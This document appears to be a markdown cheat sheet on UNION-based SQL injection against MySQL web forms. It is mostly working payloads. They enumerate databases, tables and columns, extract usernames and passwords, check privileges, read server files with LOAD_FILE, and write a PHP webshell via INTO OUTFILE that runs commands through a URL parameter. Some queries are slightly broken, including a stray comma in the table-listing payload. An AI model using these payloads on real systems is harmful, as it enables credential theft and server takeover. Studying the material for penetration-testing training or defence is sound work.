# Introduction

SQL Injection (SQLI) uses poorly configured and/or implemented web forms which interact with an underlying database.  Essentially, the relevant database can be queried by manipulating the input box on web form.

# Workflow

Enumeration for SQL injection follows the following high-level steps;

1. Database Mangement System (DBMS) fingerprinting;
2. Identify databases;
3. Identify tables in databases;
4. Identify columns in tables; and
5. Extract data from tables;

SQLI can be used to harvest information from databases and to interact wit the host operating system.  This can include reading and writing files both with and external to the database it's self i.e. the file system and creating a shell.

Once the DBMS has been identified, we need to understand how many columns are included in the systems SQL queary.  This is because our ‘UNION SELECT’ statements have to return  the same number.  We do this by using the ‘ORDER BY’ statement until an error is received.  We know that the number of columns is one less than the one that caused error.  

``` sql 

-- Identify the number of columns to form valid injection strings

ORDER BY 3 -- -

```

i.e if an error that there is no column 5 then we know that there are only 4 columns.  All subseqent ‘UNION SELECT’  statements need to return 4 columns.

OBTAIN A LIST OF DATABASES (4 column return)

Once we have identified the type of DBMS and the number of columns (4) we can begin enumerating.  The first step is to systematically identify databases, tables and columns, test for user privliges and test DMBS file system read and write. and finally establishing a webshell.

# Examples

The following code snippets demonstrate several SQL Injection techniques:

## List databases
``` sql

-- List available databases

 ' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA -- -

```

## List tables
``` sql

-- List tables within a databse

' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4, FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='db name' -- -

```

## List columns
``` sql

-- list columns within a table

 ' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='table name'-- -
 
```

## Extract data
``` sql

-- Extract data from tables

 ' UNION SELECT 1, username, password, 4 FROM db.table

```

## MySQL version
``` sql

-- Check the version of the MySQL database

 ' UNION SELECT 1, @@version, 3, 4 -- -

```

## Indentify the current DBMS user
``` sql

-- Identify the current user

 ' UNION SELECT 1, user(),3,4-- -

```

## Check user privileges
``` sql

-- Check user privileges

 ' UNION SELECT 1, super_priv, 3,4 FROM mysql.user-- -

 ' -- disregard closing single quote

 -- Add a WHERE clause for a specific user

 ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- -

```

## Reading data from a file
``` sql

-- Reading data from a file on the target system

 ' UNION SELECT 1, LOAD_FILE('path to file'), 3, 4-- -

```

## Writing data to a file and creating a webshell

``` sql

--  Writing data to a file

 ' UNION SELECT 1, '<?PHP system($_REQUEST[0]) ?>',3, 4 INTO OUTFILE 'shell.php'
 
 ' -- disregard closing single quote

 -- this will write data into a file named shell.php at the /var/www/html/ path

```

We can now execute shell commands via the URL.  By adding the following url structure we can execute commands.

``` bash

ip:port/shell.php?0=id

# This executes the id command.  id can be replaced with other commands
# for example ls, pwd, mkdir, find e.t.c.

```
